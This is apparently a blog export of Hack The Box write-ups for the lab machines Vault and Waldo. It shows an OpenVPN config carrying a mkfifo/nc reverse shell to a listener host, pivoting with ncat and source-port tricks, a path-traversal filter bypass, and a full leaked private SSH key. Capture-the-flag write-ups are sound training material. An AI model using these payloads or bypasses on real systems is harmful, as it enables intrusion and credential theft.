https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/ I\u0026rsquo;ll launch a listener inside The config which we will send to get a reverse shell remote 192.168.122.1 ifconfig 10.200.0.2 10.200.0.1 dev tun script-security 2 up \u0026#34;/bin/bash -c \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.122.1 6666 \u0026gt;/tmp/f\u0026#39;\u0026#34; nobind Upload a config and hit test dave@ubuntu:~$ nc -vlnp 6666 Listening on [0.0.0.0] (family 0, port 6666) Connection from [192.168.122.4] port 6666 [tcp/*] accepted (family 2, sport 48906) /bin/sh: 0: can\u0026#39;t access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # dave\u0026rsquo;s folder contains ssh file with creds root@DNS:/home/dave# cat ssh cat ssh dave dav3gerous567 We can use creds to ssh And dave is sudo user root@DNS:/home/dave# groups dave groups dave dave : dave sudo dave@ubuntu:~$ ssh dave@192.168.122.4 dave@192.168.122.4\u0026#39;s password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 98 packages can be updated. 50 updates are security updates. Last login: Mon Sep 3 16:38:03 2018 dave@DNS:~$ sudo -l [sudo] password for dave: Matching Defaults entries for dave on DNS: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dave may run the following commands on DNS: (ALL : ALL) ALL dave@DNS:~$ sudo su root@DNS:/home/dave# I found interesting entries in alex bash history root@DNS:/home/dave# cat /home/alex/.bash_history ... rm interfaces sudo su ping 192.168.5.2 su root nc -lvp 8888 ... If we check routing table, we have a route to 192.168.5.0/24 root@DNS:/home/dave# ip r 10.200.0.1 dev tun0 proto kernel scope link src 10.200.0.2 192.168.5.0/24 via 192.168.122.5 dev ens3 192.168.122.0/24 dev ens3 proto kernel scope link src 192.168.122.4 Let\u0026rsquo;s check logs root@DNS:/home/dave# grep -arn \u0026#34;192.168.5.2\u0026#34; /var/log /var/log/auth.log:349:Jul 17 16:49:01 DNS sshd[1912]: Accepted password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:352:Jul 17 16:49:02 DNS sshd[1943]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user /var/log/auth.log:353:Jul 17 16:49:02 DNS sshd[1943]: Disconnected from 192.168.5.2 port 4444 /var/log/auth.log:452:Jul 17 17:21:38 DNS sshd[1560]: Accepted password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:455:Jul 17 17:21:38 DNS sshd[1590]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user /var/log/auth.log:456:Jul 17 17:21:38 DNS sshd[1590]: Disconnected from 192.168.5.2 port 4444 /var/log/auth.log:474:Jul 17 21:58:26 DNS sshd[1171]: Accepted password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:478:Jul 17 21:58:29 DNS sshd[1249]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user /var/log/auth.log:479:Jul 17 21:58:29 DNS sshd[1249]: Disconnected from 192.168.5.2 port 4444 /var/log/auth.log:533:Jul 24 15:06:10 DNS sshd[1466]: Accepted password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:536:Jul 24 15:06:10 DNS sshd[1496]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user /var/log/auth.log:537:Jul 24 15:06:10 DNS sshd[1496]: Disconnected from 192.168.5.2 port 4444 /var/log/auth.log:540:Jul 24 15:06:26 DNS sshd[1500]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.5.2 user=dave /var/log/auth.log:541:Jul 24 15:06:28 DNS sshd[1500]: Failed password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:542:Jul 24 15:06:28 DNS sshd[1500]: Connection closed by 192.168.5.2 port 4444 [preauth] /var/log/auth.log:543:Jul 24 15:06:57 DNS sshd[1503]: Accepted password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:546:Jul 24 15:06:57 DNS sshd[1533]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user /var/log/auth.log:547:Jul 24 15:06:57 DNS sshd[1533]: Disconnected from 192.168.5.2 port 4444 /var/log/auth.log:550:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2 /var/log/auth.log:553:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user /var/log/auth.log:554:Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444 /var/log/auth.log:1376:Sep 2 15:07:51 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f /var/log/auth.log:1381:Sep 2 15:10:20 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 /var/log/auth.log:1383:Sep 2 15:10:34 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 N[��z\u0026lt;ssh:nottyalex192.168.122.1�N[��z\u0026lt;ssh:nottyalex192.168.122.1�N[��z�ssh:nottydave192.168.122.1N[��z�ssh:nottydave192.168.5.2d2W[���ssh:nottydave192.168.122.1�7W[��z�ssh:nottydave192.168.122.1▒8W[��z�ssh:nottydave192.168.122.18W[��z��tty1tty1dave�m9�[ܧ]ssh:nottydave192.168.122.1@�[��zcssh:nottydave192.168.122.1�T�[��z3\\9�[#P We see that nmap is installed, let\u0026rsquo;s use to port scan 192.168.5.2 root@DNS:/home/dave# nmap 192.168.5.2 -Pn -f Starting Nmap 7.01 ( https://nmap.org ) at 2023-10-25 16:39 BST mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for Vault (192.168.5.2) Host is up (0.0035s latency). Not shown: 998 filtered ports PORT STATE SERVICE 53/tcp closed domain 4444/tcp closed krb524 Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds Ports are closed, but if we set --source-port=4444 identical to logs, we see 987 is open Same goes for --source-port=53, root@DNS:/home/dave# nmap 192.168.5.2 -Pn -f --source-port=4444 Starting Nmap 7.01 ( https://nmap.org ) at 2023-10-25 16:40 BST mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for Vault (192.168.5.2) Host is up (0.0029s latency). Not shown: 999 closed ports PORT STATE SERVICE 987/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds If we check port 987 via nc, we receive ssh banner root@DNS:/home/dave# nc 192.168.5.2 987 -p 53 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 We can\u0026rsquo;t set source port on ssh But we saw entries in log: COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 It runs ncat listening to port 1234 The option --sh-exec will execute command by passing it to /bin/sh -c In our case we will have /bin/sh -c \u0026quot;ncat 192.168.5.2 987 -p 53\u0026quot; So we will have a our netcat listening to port 1234 and redirecting everything to ncat 192.168.5.2 987 -p 53 Let\u0026rsquo;s run it in the background mode and connect as dave root@DNS:/home/dave# /usr/bin/ncat -l 1234 --sh-exec \u0026#34;ncat 192.168.5.2 987 -p 53\u0026#34; \u0026amp; [1] 13700 root@DNS:/home/dave# ssh dave@localhost -p 1234 The authenticity of host \u0026#39;[localhost]:1234 ([::1]:1234)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;[localhost]:1234\u0026#39; (ECDSA) to the list of known hosts. dave@localhost\u0026#39;s password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 96 packages can be updated. 49 updates are security updates. Last login: Mon Sep 3 16:48:00 2018 dave@vault:~$ Inside we have root.txt.pgp dave@vault:~$ ls -lha total 40K drwxr-xr-x 5 dave dave 4.0K Sep 3 2018 . drwxr-xr-x 4 root root 4.0K Jul 17 2018 .. -rw------- 1 dave dave 11 Sep 3 2018 .bash_history -rw-r--r-- 1 dave dave 220 Jul 17 2018 .bash_logout -rw-r--r-- 1 dave dave 3.7K Jul 17 2018 .bashrc drwx------ 2 dave dave 4.0K Jul 17 2018 .cache drwxrwxr-x 2 dave dave 4.0K Sep 2 2018 .nano -rw-r--r-- 1 dave dave 655 Jul 17 2018 .profile -rw-rw-r-- 1 dave dave 629 Sep 3 2018 root.txt.gpg drwx------ 2 dave dave 4.0K Jul 17 2018 .ssh dave@vault:~$ We can\u0026rsquo;t do anything else, since we are inside rbash Reconnect to ssh with -t bash root@DNS:/home/dave# /usr/bin/ncat -l 1234 --sh-exec \u0026#34;ncat 192.168.5.2 987 -p 53\u0026#34; \u0026amp; [1] 13705 root@DNS:/home/dave# ssh dave@localhost -p 1234 -t bash dave@localhost\u0026#39;s password: dave@vault:~$ If we try to decrypt gpg, we receive an error It relies on key stored in the local keyring dave@vault:~$ gpg -d root.txt.gpg gpg: encrypted with RSA key, ID D1EB1F03 gpg: decryption failed: secret key not available Let\u0026rsquo;s move it to other hosts and try to decrypt it dave@vault:~$ base32 -w0 root.txt.gpg QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY= dave@ubuntu:~$ nano flag dave@ubuntu:~$ base32 -d flag \u0026gt; flag.gpg dns had the same issue, but original box was successful And the passphrase is located in dave\u0026rsquo;s desktop in key file dave@ubuntu:~$ gpg -d flag.gpg You need a passphrase to unlock the secret key for user: \u0026#34;david \u0026lt;dave@david.com\u0026gt;\u0026#34; 4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4) gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24 \u0026#34;david \u0026lt;dave@david.com\u0026gt;\u0026#34; ca468370b91d1f5906e31093d9bfe819 dave@ubuntu:~/Desktop$ cat key itscominghome ","date":"October 22, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/vault/images/vault.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/vault/","summary":"Vault Enumeration nmap └─$ nmap -Pn -p- 10.10.10.109 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:19 BST Warning: 10.10.10.109 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.109 (10.10.10.109) Host is up (0.12s latency). Not shown: 56547 filtered tcp ports (no-response), 8986 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 133.","tags":["HTB","php","upload","webshell","ssh","pivot","qemu","spice","openvpn","tunnel","rbash","gpg","remmina","iptables","sudo","filter"],"title":"[HTB] Machine: Vault"},{"categories":null,"contents":"Waldo Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.87 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 20:00 BST Stats: 0:03:49 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 72.30% done; ETC: 20:05 (0:01:28 remaining) Stats: 0:09:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 20:10 (0:00:00 remaining) Nmap scan report for 10.10.10.87 (10.10.10.87) Host is up (0.100s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.5 (protocol 2.0) | ssh-hostkey: | 2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA) | 256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA) |_ 256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519) 80/tcp open http nginx 1.12.2 |_http-trane-info: Problem with XML parsing of /evox/about |_http-server-header: nginx/1.12.2 | http-title: List Manager |_Requested resource was /list.html 8888/tcp filtered sun-answerbook Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 620.98 seconds Web server Foothold We can see bunch of requests We can see the files via /dirRead.php It looks like we can only read files from the same directory using /fileRead.php I\u0026rsquo;ll check the source code using fileRead.php └─$ curl -XPOST -s -d \u0026#34;file=fileRead.php\u0026#34; http://10.10.10.87/fileRead.php | jq -r .file \u0026lt;?php if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;POST\u0026#34;){ $fileContent[\u0026#39;file\u0026#39;] = false; header(\u0026#39;Content-Type: application/json\u0026#39;); if(isset($_POST[\u0026#39;file\u0026#39;])){ header(\u0026#39;Content-Type: application/json\u0026#39;); $_POST[\u0026#39;file\u0026#39;] = str_replace( array(\u0026#34;../\u0026#34;, \u0026#34;..\\\u0026#34;\u0026#34;), \u0026#34;\u0026#34;, $_POST[\u0026#39;file\u0026#39;]); if(strpos($_POST[\u0026#39;file\u0026#39;], \u0026#34;user.txt\u0026#34;) === false){ $file = fopen(\u0026#34;/var/www/html/\u0026#34; . $_POST[\u0026#39;file\u0026#39;], \u0026#34;r\u0026#34;); $fileContent[\u0026#39;file\u0026#39;] = fread($file,filesize($_POST[\u0026#39;file\u0026#39;])); fclose(); } } echo json_encode($fileContent); } └─$ curl -XPOST -s -d \u0026#34;file=dirRead.php\u0026#34; http://10.10.10.87/fileRead.php | jq -r .file \u0026lt;?php if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;POST\u0026#34;){ if(isset($_POST[\u0026#39;path\u0026#39;])){ header(\u0026#39;Content-type: application/json\u0026#39;); $_POST[\u0026#39;path\u0026#39;] = str_replace( array(\u0026#34;../\u0026#34;, \u0026#34;..\\\u0026#34;\u0026#34;), \u0026#34;\u0026#34;, $_POST[\u0026#39;path\u0026#39;]); echo json_encode(scandir(\u0026#34;/var/www/html/\u0026#34; . $_POST[\u0026#39;path\u0026#39;])); }else{ header(\u0026#39;Content-type: application/json\u0026#39;); echo \u0026#39;[false]\u0026#39;; } } We have a filter str_replace( array(\u0026quot;../\u0026quot;, \u0026quot;..\\\u0026quot;\u0026quot;), \u0026quot;\u0026quot;, $_POST['\u0026lt;FILE|PATH\u0026gt;']); We could bypass it via ....//, since the check happens once └─$ curl -XPOST -s -d \u0026#34;path=....//....//....//\u0026#34; http://10.10.10.87/dirRead.php | jq -r [ \u0026#34;.\u0026#34;, \u0026#34;..\u0026#34;, \u0026#34;.dockerenv\u0026#34;, \u0026#34;bin\u0026#34;, \u0026#34;dev\u0026#34;, \u0026#34;etc\u0026#34;, \u0026#34;home\u0026#34;, \u0026#34;lib\u0026#34;, \u0026#34;media\u0026#34;, \u0026#34;mnt\u0026#34;, \u0026#34;proc\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;sbin\u0026#34;, \u0026#34;srv\u0026#34;, \u0026#34;sys\u0026#34;, \u0026#34;tmp\u0026#34;, \u0026#34;usr\u0026#34;, \u0026#34;var\u0026#34; ] Let\u0026rsquo;s check users and their home directories └─$ curl -XPOST -s -d \u0026#34;path=....//....//....//home/nobody/.ssh\u0026#34; http://10.10.10.87/dirRead.php | jq -r [ \u0026#34;.\u0026#34;, \u0026#34;..\u0026#34;, \u0026#34;.monitor\u0026#34;, \u0026#34;authorized_keys\u0026#34;, \u0026#34;known_hosts\u0026#34; ] Strange file .monitor, which is private key └─$ curl -XPOST -s -d \u0026#34;file=....//....//....//home/nobody/.ssh/.monitor\u0026#34; http://10.10.10.87/fileRead.php | jq -r .file -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f 87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6 pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5 8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q 1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7 VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1 /pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/ lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9 1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2 DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro= -----END RSA PRIVATE KEY----- Connect with ssh key └─$ ssh nobody@10.10.10.87 -i id_rsa Warning: Permanently added \u0026#39;10.10.10.87\u0026#39; (ED25519) to the list of known hosts. Welcome to Alpine! The Alpine Wiki contains a large amount of how-to guides and general information about administrating Alpine systems. See \u0026lt;http://wiki.alpinelinux.org\u0026gt;. waldo:~$ User We saw dockerenv file, so it could be a container We also have docker interface, which further suggests it waldo:~$ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2: ens192: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:50:56:b9:3d:46 brd ff:ff:ff:ff:ff:ff inet 10.10.10.87/24 brd 10.10.10.255 scope global ens192 valid_lft forever preferred_lft forever 3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN link/ether 02:42:ec:91:3e:18 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever Listening ports waldo:~$ netstat -tulpn netstat: can\u0026#39;t scan /proc - are you root? Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN - tcp 0 0 :::80 :::* LISTEN - tcp 0 0 :::22 :::* LISTEN - tcp 0 0 :::8888 :::* LISTEN - If we check /etc/ssh/sshd_config, we see that ssh uses port 8888 # $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/bin:/usr/bin:/sbin:/usr/sbin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. Port 8888 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: ... It\u0026rsquo;s quite possible that it has port forwarding configured The private key .monitor, but there are no users with that name Let\u0026rsquo;s try to ssh using the same key again, but as monitor user waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64 \u0026amp;. @@@,@@/ % #*/%@@@@/.\u0026amp;@@, @@@#@@#\u0026amp;@#\u0026amp;#\u0026amp;@@@,*%/ /@@@\u0026amp;###########@@\u0026amp;*(* (@################%@@@@@. /** @@@@\u0026amp;#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/ %@@@@%##########\u0026amp;@@@.... .#%#@@@@@@@# @@\u0026amp;%#########@@@@/ */@@@%(((@@@% @@@#%@@%@@@, *\u0026amp;@@@\u0026amp;%(((#((((@@( /(@@@@@@@ *\u0026amp;@@@@%((((((((((((#@@( %/#@@@/@ @#/@ ..@@@@%(((((((((((#((#@@@@@@@@@@@@\u0026amp;#, %@*(@#%@., /@@@@\u0026amp;(((((((((((((((\u0026amp;@@@@@@\u0026amp;#######%%@@@@# \u0026amp; *@@@@@# .\u0026amp;@@@#(((#(#((((((((#%@@@@@%###\u0026amp;@@@@@@@@@\u0026amp;%##\u0026amp;@@@@@@/ /@@ #@@@\u0026amp;#(((((((((((#((@@@@@%%%%@@@@%#########%\u0026amp;@@@@@@@@\u0026amp; *@@ *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###\u0026amp;@@@@@@@\u0026amp; %@/ .\u0026amp;%@@%#(((((((((((((((#@@@@@@@\u0026amp;#####%@@@%#############%@@@\u0026amp;%##\u0026amp;@@/ @@@@@@%(((((((((((##(((@@@@\u0026amp;%####%@@@%#####\u0026amp;@@@@@@@@@@@@@@@\u0026amp;##\u0026amp;@@@@@@@@@/ @@@\u0026amp;(((#((((((((((((#@@@@@\u0026amp;@@@@######@@@###################\u0026amp;@@@\u0026amp;#####%@@* @@#(((((((((((((#@@@@%\u0026amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@ *@@%((((((((#@@@@@@@%#\u0026amp;@@,,.,,.\u0026amp;@@@#####################%@@@@@@%######\u0026amp;@@. @@@#(#\u0026amp;@@@@@\u0026amp;##\u0026amp;@@@\u0026amp;#@@/,,,,,,,,@@@\u0026amp;######\u0026amp;@@@@@@@@\u0026amp;\u0026amp;%######%@@@@@@@@@@@ @@@@@@\u0026amp;%\u0026amp;@@@%#\u0026amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*\u0026amp;@@%\u0026amp;@@@@@@\u0026amp;%#####%@@@@. .@@@###\u0026amp;@@@%%@(,,,%@\u0026amp;,.,,,,,,,,,,,,,.*\u0026amp;@@@@\u0026amp;(,*@\u0026amp;#@%%@@@@@@@@@@@@* @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%\u0026amp;@@@@(\u0026amp;@\u0026amp;@\u0026amp;@@@@( .@@\u0026amp;##@@,,/@@@@\u0026amp;(. .\u0026amp;@@@\u0026amp;,,,.\u0026amp;@@/ #@@%@@@@@\u0026amp;@@@/ *@@@@@\u0026amp;@@.*@@@ %@@@*,\u0026amp;@@ *@@@@@\u0026amp;.#/,@/ *@@\u0026amp;*#@@@@@@@\u0026amp; #@( .@@@@@@\u0026amp; ,@@@, @@@@@(,@/@@ *@@/@#.#@@@@@/ %@@@, .@@\u0026amp;%@@@ \u0026amp;@\u0026amp; @@*@@*(@@# (@@/@,,@@\u0026amp;@@@ \u0026amp;@@,,(@@\u0026amp; .@@%/@@,@@ /@@@*,@@,@@@* @@@,,,,,@@@@. *@@@%,@@**@# %@@.%@\u0026amp;,(@@@@, /\u0026amp;@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@, ,@@,\u0026amp;@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,\u0026amp;@ \u0026amp;@,*@@.,,,,,..,,,,\u0026amp;@@%/**/@@*,,,,,\u0026amp;(.,,,.@@,,@@ /@%,\u0026amp;@/,,,,/@%,,,,,*\u0026amp;@@@@@#.,,,,,.@@@(,,(@@@@@( @@*,@@,,,#@@@\u0026amp;*..,,,,,,,,,,,,/@@@@,*(,,\u0026amp;@/#* *@@@@@(,,@*,%@@@@@@@\u0026amp;\u0026amp;#%@@@@@@@/,,,,,,,@@ @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,\u0026amp;@, @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@ \u0026amp;@\u0026amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,\u0026amp;@# %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@ ,@@,,,,,,,,@@@\u0026amp;\u0026amp;\u0026amp;%\u0026amp;@,,,,,..,,@@, *@@,,,,,,,.,****,..,,,,,,,,\u0026amp;@@ (@(,,,.,,,,,,,,,,,,,,.,,,/@@ .@@,,,,,,,,,,,,,...,,,,,,@@ ,@@@,,,,,,,,,,,,,,,,.(@@@ %@@@@\u0026amp;(,,,,*(#\u0026amp;@@@@@@, Here\u0026#39;s Waldo, where\u0026#39;s root? Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1 -rbash: alias: command not found monitor@waldo:~$ Root We are inside restricted shell monitor@waldo:~$ cd / -rbash: cd: restricted We can see the list of commands we can use monitor@waldo:~$ ls -lha bin total 8.0K dr-xr-x--- 2 root monitor 4.0K Sep 8 2022 . drwxr-x--- 5 root monitor 4.0K Sep 8 2022 .. lrwxrwxrwx 1 root root 7 May 3 2018 ls -\u0026gt; /bin/ls lrwxrwxrwx 1 root root 13 May 3 2018 most -\u0026gt; /usr/bin/most lrwxrwxrwx 1 root root 7 May 3 2018 red -\u0026gt; /bin/ed lrwxrwxrwx 1 root root 9 May 3 2018 rnano -\u0026gt; /bin/nano If we open /etc/passwd with rnano, we see that we have /bin/rbash as our shell We can escape it by adding -t \u0026quot;bash --noprofile\u0026quot; when connecting via ssh waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost -t \u0026#34;bash --noprofile\u0026#34; monitor@waldo:~$ ls /etc adduser.conf bluetooth debconf.conf fstab hostname issue.net logcheck 